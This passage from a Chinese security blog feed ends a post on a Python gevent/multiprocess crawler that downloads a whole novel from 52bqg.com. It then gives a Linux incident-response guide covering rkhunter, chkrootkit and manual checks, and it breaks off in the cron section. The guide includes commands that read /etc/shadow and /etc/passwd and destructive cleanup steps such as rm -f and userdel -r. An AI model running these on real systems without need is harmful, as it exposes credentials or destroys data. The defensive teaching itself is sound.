patch完成。</p><p>然后创建的我们的协程池，这里将<code>url</code>加入到我们的协程池当中，注意这里采用了<code>apply_async</code>，即异步非阻塞</p><figure class="highlight coq"><table><tr><td class="code"><pre><span class="line"><span class="built_in">apply</span>是阻塞式的。</span><br><span class="line"></span><br><span class="line">首先主进程开始运行，碰到子进程，操作系统切换到子进程，等待子进程运行结束后，在切换到另外一个子进程，直到所有子进程运行完毕。然后在切换到主进程，运行剩余的部分。</span><br><span class="line"></span><br><span class="line">apply_async是异步非阻塞式的。</span><br><span class="line"></span><br><span class="line">首先主进程开始运行，碰到子进程后，主进程说：让我先运行个够，等到操作系统进行进程切换的时候，在交给子进程运行。以为我们的程序太短，然而还没等到操作系统进行进程切换，主进程就运行完毕了。</span><br><span class="line">想要子进程执行，就告诉主进程：你等着所有子进程执行完毕后，在运行剩余部分。</span><br></pre></td></tr></table></figure><p>反正知道阻塞的会特别慢，直接调用<code>apply_async</code>即可</p><p>将所有的任务加到协程池后就<code>join</code>阻塞当前线程直到所有的协程任务完成</p><h2 id="全部代码"><a href="#全部代码" class="headerlink" title="全部代码"></a>全部代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> cpu_count</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, ProcessPoolExecutor, wait, ALL_COMPLETED</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> gevent.pool <span class="keyword">import</span> Pool <span class="keyword">as</span> ge_pool</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">indexUrl = <span class="string">"https://www.52bqg.com/book_203/"</span></span><br><span class="line"></span><br><span class="line">CPU_NUM = cpu_count()</span><br><span class="line">THREAD_NUM = <span class="number">4</span></span><br><span class="line">GEVENT_NUM = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">splitUrl</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, splitnum, urls)</span>:</span></span><br><span class="line">        self.splitnum = splitnum</span><br><span class="line">        self.urls = urls</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        num_urls = len(self.urls)</span><br><span class="line">        <span class="keyword">if</span> num_urls &lt; self.splitnum:</span><br><span class="line">            <span class="keyword">return</span> [self.urls]</span><br><span class="line">        perUrlNum = int(num_urls / self.splitnum)</span><br><span class="line">        splitted_urls = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.splitnum):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                splitted_urls.append(self.urls[: (i + <span class="number">1</span>) * perUrlNum])</span><br><span class="line">            <span class="keyword">elif</span> i == self.splitnum - <span class="number">1</span>:</span><br><span class="line">                splitted_urls.append(self.urls[i * perUrlNum:])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                splitted_urls.append(self.urls[i * perUrlNum: (i + <span class="number">1</span>) * perUrlNum])</span><br><span class="line">        <span class="keyword">return</span> splitted_urls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getIndexUrl</span><span class="params">(indexUrl)</span>:</span></span><br><span class="line">    allUrls = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = session.get(url=indexUrl)</span><br><span class="line">        bs = BeautifulSoup(res.content.decode(<span class="string">"GBK"</span>), <span class="string">"lxml"</span>)</span><br><span class="line">        lists = bs.find(<span class="string">"div"</span>, id=<span class="string">"list"</span>)</span><br><span class="line">        dd = lists.find_all(<span class="string">"dd"</span>)</span><br><span class="line">        <span class="keyword">for</span> eachdd <span class="keyword">in</span> dd:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                a = eachdd.find(<span class="string">"a"</span>)</span><br><span class="line">                href = a[<span class="string">'href'</span>]</span><br><span class="line">                allUrls.append(indexUrl + href)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> allUrls</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getContent</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = session.get(url)</span><br><span class="line">        bs = BeautifulSoup(res.content.decode(<span class="string">"GBK"</span>), <span class="string">"lxml"</span>)</span><br><span class="line">        content = bs.find(<span class="string">"div"</span>, id=<span class="string">"content"</span>).get_text()</span><br><span class="line">        title = bs.find(<span class="string">"div"</span>, class_=<span class="string">"bookname"</span>).find(<span class="string">"h1"</span>).get_text()</span><br><span class="line">        writeContent(title, content)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeContent</span><span class="params">(title, content)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"content/&#123;&#125;.txt"</span>.format(title), <span class="string">"w+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(content)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multiProcessScheduler</span><span class="params">(splitted_urls)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> CPU_NUM</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        executor = ProcessPoolExecutor(max_workers=CPU_NUM)</span><br><span class="line">        all_tasks = executor.map(threadScheduler, splitted_urls)</span><br><span class="line">        wait(all_tasks, return_when=ALL_COMPLETED)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">threadScheduler</span><span class="params">(urlss)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> THREAD_NUM</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        splitted_urls = splitUrl(THREAD_NUM, urlss).run()</span><br><span class="line">        executor = ThreadPoolExecutor(max_workers=THREAD_NUM)</span><br><span class="line">        all_tasks = executor.map(greenletScheduler, splitted_urls)</span><br><span class="line">        wait(all_tasks, return_when=ALL_COMPLETED)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greenletScheduler</span><span class="params">(urls)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> GEVENT_NUM</span><br><span class="line">    greenlet_pool = ge_pool(GEVENT_NUM)</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        greenlet_pool.apply_async(getContent, (url,))</span><br><span class="line">    greenlet_pool.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">"content"</span>):</span><br><span class="line">        os.mkdir(<span class="string">"content"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    start = timeit.default_timer()</span><br><span class="line">    allUrls = getIndexUrl(indexUrl)</span><br><span class="line">    splitted_urls = splitUrl(CPU_NUM, allUrls).run()</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> splitted_urls:</span><br><span class="line">        print(each)</span><br><span class="line">    multiProcessScheduler(splitted_urls)</span><br><span class="line">    end = timeit.default_timer()</span><br><span class="line">    print(str(end - start))</span><br></pre></td></tr></table></figure><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200414133610745.png" alt="image-20200414133610745"></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200414132119788.png" alt="image-20200414132119788"></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200414134148216.png" alt="image-20200414134148216"></p><p>可以看到一共27秒即可爬完所有的8300章的小说，比同步一章一章爬取快的不知道哪去了</p><p>所以说对于爬虫而言，最好采用异步来加快速度，</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>异步编程是一门巨坑，如果调度不当的话，很可能陷入巨坑无法自拔，而且多进程这里<code>debug</code>不了，我看网上建议是通过阻塞子进程或者print调试法-_-</li><li>现在python3.6出现了<code>asyncio、aiohttp</code>两个异步IO模块，打算下一期使用这两个模块进行改造</li><li>异步编程尤其要注意，不要随意增加print等IO操作，否则操作系统还得回来调度IO，增加开销时间</li><li>感觉还是很初级，下一次试试采用队列等进行有序归并，顺便看看<code>map_reduce</code>?</li></ul><p>最重要的是，多进程编程千万不要写递归！！！</p><p>否则就会这样↓↓↓↓↓↓↓↓</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/BAFB3972931871C4D9A49477A2326D7F.jpg" alt="BAFB3972931871C4D9A49477A2326D7F"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文内容：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;python当中的异步并发编程以及编程实例&lt;/p&gt;
    
    </summary>
    
    
      <category term="安全研发" scheme="https://a2u13.com/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E5%8F%91/"/>
    
    
      <category term="异步编程" scheme="https://a2u13.com/tags/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>入侵响应与应急整理</title>
    <link href="https://a2u13.com/2020/03/28/%E5%85%A5%E4%BE%B5%E5%93%8D%E5%BA%94%E4%B8%8E%E5%BA%94%E6%80%A5%E6%95%B4%E7%90%86/"/>
    <id>https://a2u13.com/2020/03/28/%E5%85%A5%E4%BE%B5%E5%93%8D%E5%BA%94%E4%B8%8E%E5%BA%94%E6%80%A5%E6%95%B4%E7%90%86/</id>
    <published>2020-03-28T13:55:43.000Z</published>
    <updated>2020-06-07T06:28:28.966Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文内容：</strong></p><p>Linux下入侵响应与应急处理措施</p><a id="more"></a><h1 id="脚本检测"><a href="#脚本检测" class="headerlink" title="脚本检测"></a>脚本检测</h1><h2 id="使用Rootkit-Hunter"><a href="#使用Rootkit-Hunter" class="headerlink" title="使用Rootkit Hunter"></a>使用Rootkit Hunter</h2><p>安装</p><blockquote><p><code>sudo apt install rkhunter</code></p></blockquote><p>使用方法</p><blockquote><p>扫描命令：<code>rhkhunter --check</code></p><p>软件升级：<code>rkhunter --update</code></p></blockquote><p>帮助信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@9ed2390e34cc:/chkrootkit-0.53# rkhunter -h</span><br><span class="line"></span><br><span class="line">Usage: rkhunter &#123;--check | --unlock | --update | --versioncheck |</span><br><span class="line">                 --propupd [&#123;filename | directory | package name&#125;,...] |</span><br><span class="line">                 --list [&#123;tests | &#123;lang | languages&#125; | rootkits | perl | propfiles&#125;] |</span><br><span class="line">                 --config-check | --version | --help&#125; [options]</span><br><span class="line"></span><br><span class="line">Current options are:</span><br><span class="line">         --append-log                  Append to the logfile, do not overwrite</span><br><span class="line">         --bindir &lt;directory&gt;...       Use the specified command directories</span><br><span class="line">     -c, --check                       Check the local system</span><br><span class="line">     -C, --config-check                Check the configuration file(s), then exit</span><br><span class="line">  --cs2, --color-set2                  Use the second color set for output</span><br><span class="line">         --configfile &lt;file&gt;           Use the specified configuration file</span><br><span class="line">         --cronjob                     Run as a cron job</span><br><span class="line">                                       (implies -c, --sk and --nocolors options)</span><br><span class="line">         --dbdir &lt;directory&gt;           Use the specified database directory</span><br><span class="line">         --debug                       Debug mode</span><br><span class="line">                                       (Do not use unless asked to do so)</span><br><span class="line">         --disable &lt;test&gt;[,&lt;test&gt;...]  Disable specific tests</span><br><span class="line">                                       (Default is to disable no tests)</span><br><span class="line">         --display-logfile             Display the logfile at the end</span><br><span class="line">         --enable  &lt;test&gt;[,&lt;test&gt;...]  Enable specific tests</span><br><span class="line">                                       (Default is to enable all tests)</span><br><span class="line">         --hash &#123;MD5 | SHA1 | SHA224 | SHA256 | SHA384 | SHA512 |</span><br><span class="line">                 NONE | &lt;command&gt;&#125;     Use the specified file hash function</span><br><span class="line">                                       (Default is SHA256)</span><br><span class="line">     -h, --help                        Display this help menu, then exit</span><br><span class="line"> --lang, --language &lt;language&gt;         Specify the language to use</span><br><span class="line">                                       (Default is English)</span><br><span class="line">         --list [tests | languages |   List the available test names, languages,</span><br><span class="line">                 rootkits | perl |     rootkit names, perl module status</span><br><span class="line">                 propfiles]            or file properties database, then exit</span><br><span class="line">     -l, --logfile [file]              Write to a logfile</span><br><span class="line">                                       (Default is /var/log/rkhunter.log)</span><br><span class="line">         --noappend-log                Do not append to the logfile, overwrite it</span><br><span class="line">         --nocf                        Do not use the configuration file entries</span><br><span class="line">                                       for disabled tests (only valid with --disable)</span><br><span class="line">         --nocolors                    Use black and white output</span><br><span class="line">         --nolog                       Do not write to a logfile</span><br><span class="line">--nomow, --no-mail-on-warning          Do not send a message if warnings occur</span><br><span class="line">   --ns, --nosummary                   Do not show the summary of check results</span><br><span class="line"> --novl, --no-verbose-logging          No verbose logging</span><br><span class="line">         --pkgmgr &#123;RPM | DPKG | BSD |  Use the specified package manager to obtain</span><br><span class="line">                   BSDng | SOLARIS |   or verify file property values.</span><br><span class="line">                   NONE&#125;               (Default is NONE)</span><br><span class="line">         --propupd [file | directory | Update the entire file properties database,</span><br><span class="line">                    package]...        or just for the specified entries</span><br><span class="line">     -q, --quiet                       Quiet mode (no output at all)</span><br><span class="line">  --rwo, --report-warnings-only        Show only warning messages</span><br><span class="line">   --sk, --skip-keypress               Don't wait for a keypress after each test</span><br><span class="line">         --summary                     Show the summary of system check results</span><br><span class="line">                                       (This is the default)</span><br><span class="line">         --syslog [facility.priority]  Log the check start and finish times to syslog</span><br><span class="line">                                       (Default level is authpriv.notice)</span><br><span class="line">         --tmpdir &lt;directory&gt;          Use the specified temporary directory</span><br><span class="line">         --unlock                      Unlock (remove) the lock file</span><br><span class="line">         --update                      Check for updates to database files</span><br><span class="line">   --vl, --verbose-logging             Use verbose logging (on by default)</span><br><span class="line">     -V, --version                     Display the version number, then exit</span><br><span class="line">         --versioncheck                Check for latest version of program</span><br><span class="line">     -x, --autox                       Automatically detect if X is in use</span><br><span class="line">     -X, --no-autox                    Do not automatically detect if X is in use</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329000808354.png" alt="image-20200329000808354"></p><h2 id="使用chkrootkit"><a href="#使用chkrootkit" class="headerlink" title="使用chkrootkit"></a>使用chkrootkit</h2><p>安装</p><blockquote><p><code>wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</code></p><p><code>tar -zxvf chkrootkit.tar.gz</code></p><p><code>make sense</code></p></blockquote><p>检测</p><blockquote><p><code>./chkrootkit | grep INFECTED</code></p></blockquote><p>如果出现<code>INFECTED</code>则说明系统出问题了</p><p>（不过我使用的时候卡住了，大半天没反应，不知道怎么回事。。。。</p><p>帮助信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@9ed2390e34cc:/chkrootkit-0.53# ./chkrootkit -h</span><br><span class="line">Usage: ./chkrootkit [options] [test ...]</span><br><span class="line">Options:</span><br><span class="line">        -h                show this help and exit</span><br><span class="line">        -V                show version information and exit</span><br><span class="line">        -l                show available tests and exit</span><br><span class="line">        -d                debug</span><br><span class="line">        -q                quiet mode</span><br><span class="line">        -x                expert mode</span><br><span class="line">        -r dir            use dir as the root directory</span><br><span class="line">        -p dir1:dir2:dirN path for the external commands used by chkrootkit</span><br><span class="line">        -n                skip NFS mounted dirs</span><br></pre></td></tr></table></figure><p>检测流程</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 搜索通用的ROOTKIT特征的字符串</span><br><span class="line"><span class="number">2.</span> 对某种特定的rootkits，或者命令的特殊的感染特征进行检测</span><br><span class="line"><span class="number">3.</span> 对某种特定的rootkits的生成的特定文件的检测</span><br><span class="line"><span class="number">4.</span> 对程序的SUID位的设置进行检测</span><br><span class="line"><span class="number">5.</span> 对ldsopreload的检测</span><br><span class="line"><span class="number">6.</span> 查找可疑的log文件</span><br><span class="line"><span class="number">7.</span> 查找可疑的php文件</span><br><span class="line"><span class="number">8.</span> 检测.history文件</span><br><span class="line"><span class="number">9.</span> 检测有无程序监听了一些可疑的端口</span><br><span class="line"><span class="number">10.</span> 检测Linux可加载内核模块</span><br><span class="line"><span class="number">11.</span> 检测有无隐藏进程</span><br><span class="line"><span class="number">12.</span> 检测目录的软链接异常</span><br><span class="line"><span class="number">13.</span> 检测网络接口的异常</span><br><span class="line"><span class="number">14.</span> 检测用户的登录日志</span><br><span class="line"><span class="number">15.</span> 检测上一次登录</span><br><span class="line"><span class="number">16.</span> 检测可疑的没有tty记录的进程</span><br></pre></td></tr></table></figure><h1 id="手工排查"><a href="#手工排查" class="headerlink" title="手工排查"></a>手工排查</h1><p>检测步骤：</p><blockquote><p>识别现象-&gt; 清除病毒-&gt; 闭环兜底-&gt; 系统加固</p></blockquote><ol><li>先识别出病毒的可疑现象</li><li>然后定位到具体的病毒进程以及病毒文件，进行清除</li><li>完成前2步还不够，病毒一般会通过一些自启动项及守护程序进行重复感染，所以我们要执行闭环兜底确保病毒不再被创建</li><li>将主机上的病毒项清除干净后，最后就是进行系统加固了，防止病毒从Web再次入侵进来。</li></ol><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329003355739.png" alt="image-20200329003355739"></p><center>图片来自于<a hreg="https://edr.sangfor.com.cn/#/information/news_detail?id=214&type=index" >【实用指南    】最全Linux应急响应技巧，看这一篇就够了</a></center><h2 id="识别现象"><a href="#识别现象" class="headerlink" title="识别现象"></a>识别现象</h2><h3 id="文件查找"><a href="#文件查找" class="headerlink" title="文件查找"></a>文件查找</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find ./ -mtime 0 -name "*.jsp" 查找24小时内被修改的JSP文件</span><br><span class="line">find / -ctime -2 查找72小时内新增的文件 </span><br><span class="line">ls -al /tmp | grep "Nov 22" 查找指定时间内修改的文件 </span><br><span class="line">find / -uid 0 -print 查找特权用户文件</span><br><span class="line">find / -size +10000k -print：查找大于10000k的文件</span><br><span class="line">find / -name “…” -print 查找用户名为…的文件</span><br><span class="line">find / -name core -exec ls -l &#123;&#125; \; 查找core文件，并列出详细信息</span><br><span class="line">md5sum -b filename 查看文件的md5值</span><br><span class="line">rpm -qf /bin/ls 检查文件的完整性（还有其它/bin目录下的文件）</span><br></pre></td></tr></table></figure><h3 id="查看CPU占用情况"><a href="#查看CPU占用情况" class="headerlink" title="查看CPU占用情况"></a>查看CPU占用情况</h3><blockquote><p>1：在命令行提示符执行top命令</p><p>2：输入大写P，则结果按CPU占用降序排序。输入大写M，结果按内存占用降序排序。</p></blockquote><p>或者使用<code>htop</code>工具，通过<code>F6</code>设置根据CPU使用率排序</p><p>我这边电脑没病毒木马啥的，就演示一下效果</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329004239161.png" alt="image-20200329004239161"></p><h3 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h3><p>ps指令</p><p>详细指令：<a href="https://www.cnblogs.com/jiqing9006/p/10036676.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiqing9006/p/10036676.html</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -ef 显示所有进程的UID,PPIP,C与STIME栏位</span><br><span class="line">ps aux 或 ps -aux 列出所有终端机的进程</span><br><span class="line">ps auxc 或 ps -auxc 同时显示真正的指令名称</span><br><span class="line">ps axjf 或 ps -axjf</span><br><span class="line">ps axjfc 或 ps -axjfc</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329010753113.png" alt="image-20200329010753113"></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329010813307.png" alt="image-20200329010813307"></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329010837284.png" alt="image-20200329010837284"></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329010914754.png" alt="image-20200329010914754"></p><p>一般使用<code>ps -aux</code>来寻找命令行里是否存在异常，如包括<code>url</code>之类的</p><p><strong>检查隐藏进程</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -ef | awk '&#123;print &#125;' | sort -n | uniq &gt;1</span><br><span class="line">ls /proc | sort -n |uniq &gt;2</span><br><span class="line">diff 1 2</span><br></pre></td></tr></table></figure><p>查看进程树</p><blockquote><p><code>pstree -p</code></p></blockquote><h3 id="安全网关报警情况"><a href="#安全网关报警情况" class="headerlink" title="安全网关报警情况"></a>安全网关报警情况</h3><p>监控报警IP地址的进程</p><blockquote><p><code>while true; do netstat -antp | grep [ip]; done</code></p></blockquote><p>如果是恶意域名导致IP地址为动态的，则可以在本地<code>hosts</code>把这个域名定向到一个随机IP地址,，然后使用上条指令进行分析</p><h3 id="查看历史命令"><a href="#查看历史命令" class="headerlink" title="查看历史命令"></a>查看历史命令</h3><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329011447512.png" alt="image-20200329011447512"></p><h3 id="查找错误登录情况"><a href="#查找错误登录情况" class="headerlink" title="查找错误登录情况"></a>查找错误登录情况</h3><blockquote><p><code>lastb</code></p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329152206502.png" alt="image-20200329152206502"></p><h3 id="查看端口情况"><a href="#查看端口情况" class="headerlink" title="查看端口情况"></a>查看端口情况</h3><blockquote><p><code>netstat -antlp</code></p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329154055072.png" alt="image-20200329154055072"></p><h3 id="查看网卡"><a href="#查看网卡" class="headerlink" title="查看网卡"></a>查看网卡</h3><blockquote><p><code>ip link | grep PROMISC</code></p><p><code>arp -a</code></p></blockquote><h3 id="查看用户信息"><a href="#查看用户信息" class="headerlink" title="查看用户信息"></a>查看用户信息</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">who     查看当前登录用户（tty本地登陆  pts远程登录）</span><br><span class="line">w       查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">uptime  查看登陆多久、多少用户，负载</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329153359295.png" alt="image-20200329153359295"></p><p>1、查询特权用户特权用户(uid 为0)</p><blockquote><p><code>awk -F: &#39;$3==0{print $1}&#39; /etc/passwd</code></p></blockquote><p>2、查询可以远程登录的帐号信息</p><blockquote><p><code>awk &#39;/\$1|\$6/{print $1}&#39; /etc/shadow</code></p></blockquote><p>3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</p><blockquote><p><code>more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></p></blockquote><p>4、禁用或删除多余及可疑的帐号</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">usermod -L user    禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头</span><br><span class="line">userdel user       删除user用户</span><br><span class="line">userdel -r user    将删除user用户，并且将/home目录下的user目录一并删除</span><br></pre></td></tr></table></figure><h3 id="查看系统运行级别"><a href="#查看系统运行级别" class="headerlink" title="查看系统运行级别"></a>查看系统运行级别</h3><blockquote><p><code>runlevel</code></p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329154453173.png" alt="image-20200329154453173"></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329154540361.png" alt="image-20200329154540361"></p><p>修改默认级别</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi  /etc/inittab</span><br><span class="line">id=3：initdefault  系统开机后直接进入哪个运行级别</span><br></pre></td></tr></table></figure><h3 id="开机启动配置文件审查"><a href="#开机启动配置文件审查" class="headerlink" title="开机启动配置文件审查"></a>开机启动配置文件审查</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/etc/rc.local</span></span><br><span class="line"><span class="string">/etc/rc.d/rc</span>[0~6]<span class="string">.d</span></span><br></pre></td></tr></table></figure><p>当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在<code>/etc/init.d</code>目录下，然后在<code>/etc/rc.d/rc*.d</code>中建立软链接即可</p><blockquote><p><code>ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</code></p></blockquote><p>入侵审查</p><blockquote><p><code>more /etc/rc.local /etc/rc.d/rc[0~6].d ls -l /etc/rc.d/rc3.d/</code></p></blockquote><h3 id="检验RPM包"><a href="#检验RPM包" class="headerlink" title="检验RPM包"></a>检验RPM包</h3><blockquote><p><code>rpm -Va</code></p></blockquote><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">S.5<span class="built_in">..</span><span class="built_in">..</span>T.  c /etc/hosts.deny</span><br><span class="line">S.5<span class="built_in">..</span><span class="built_in">..</span>T.  c /etc/profile</span><br><span class="line">missing     /var/run/wpa_supplicant</span><br><span class="line">missing     /var/log/ntpstats</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span>L<span class="built_in">..</span><span class="built_in">..</span>  c /etc/pam.d/fingerprint-auth</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span>L<span class="built_in">..</span><span class="built_in">..</span>  c /etc/pam.d/password-auth</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span>L<span class="built_in">..</span><span class="built_in">..</span>  c /etc/pam.d/postlogin</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span>L<span class="built_in">..</span><span class="built_in">..</span>  c /etc/pam.d/smartcard-auth</span><br><span class="line">S.5<span class="built_in">..</span><span class="built_in">..</span>T.  c /etc/pam.d/system-auth</span><br><span class="line">S.5<span class="built_in">..</span><span class="built_in">..</span>T.  c /etc/security/limits.conf</span><br><span class="line">S.5<span class="built_in">..</span><span class="built_in">..</span>T.  c /etc/logrotate.conf</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.T.  c /etc/sysconfig/shellinaboxd</span><br><span class="line">S.5<span class="built_in">..</span><span class="built_in">..</span>T.  c /etc/infiniband/openib.conf</span><br><span class="line">S.5<span class="built_in">..</span><span class="built_in">..</span>T.    /etc/udev/rules.d/90-ib.rules</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.T.    /etc/udev/rules.d/10-knem.rules</span><br></pre></td></tr></table></figure><blockquote><p>S 表示文件长度发生了变化<br>M 表示文件的访问权限或文件类型发生了变化<br>5 表示MD5校验和发生了变化<br>D 表示设备节点的属性发生了变化<br>L 表示文件的符号链接发生了变化<br>U 表示文件/子目录/ 设备节点的owner 发生了变化<br>G 表示文件/子目录/ 设备节点的group 发生了变化<br>T 表示文件最后一次的修改时间是发生了变化</p></blockquote><p>如果命令被替换了，如果还原回来：</p><p>文件提取还原案例：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm  -qf /bin/ls  查询ls命令属于哪个软件包</span><br><span class="line">mv  /bin/ls /tmp  先把ls转移到tmp目录下，造成ls命令丢失的假象</span><br><span class="line">rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取rpm包中ls命令到当前目录的/bin/ls下</span><br><span class="line">cp /root/bin/ls  /bin/ 把ls命令复制到/bin/目录 修复文件丢</span><br></pre></td></tr></table></figure><h2 id="清除病毒"><a href="#清除病毒" class="headerlink" title="清除病毒"></a>清除病毒</h2><p>结束进程</p><blockquote><p><code>kill -9 进程名</code></p></blockquote><p>定位病毒进程对应的文件路径：</p><blockquote><p><code>ls -al /proc/[pid]/exe</code></p></blockquote><blockquote><p><code>rm -f [exe_path]</code></p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329012240682.png" alt="image-20200329012240682"></p><p>我这没病毒，就只能演示一下过程。。</p><h2 id="寻找权限维持"><a href="#寻找权限维持" class="headerlink" title="寻找权限维持"></a>寻找权限维持</h2><h3 id="检查定时任务"><a href="#检查定时任务" class="headerlink" title="检查定时任务"></a>检查定时任务</h3><p>检查以下定时任务文件</p><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">/var/spool/cron/* </span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/* </span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span 